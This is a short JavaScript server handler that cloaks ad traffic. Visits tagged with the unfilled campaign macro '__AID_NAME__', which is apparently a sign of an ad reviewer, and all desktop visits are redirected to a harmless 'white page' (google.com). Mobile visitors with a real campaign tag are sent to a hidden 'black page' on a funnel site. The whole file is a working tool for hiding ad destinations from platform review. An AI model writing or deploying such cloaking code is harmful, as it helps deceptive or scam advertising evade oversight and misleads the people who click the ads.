import isRedirectEnabled from './config';

export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://google.com";
    const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
    //const iframeSrc = isRedirectEnabled ? defaultIframeURL : alternateIframeURL;

    const lvh = `
    <html>
        <body>
            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://google.com"></iframe>
        </body>
    </html>
`;
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
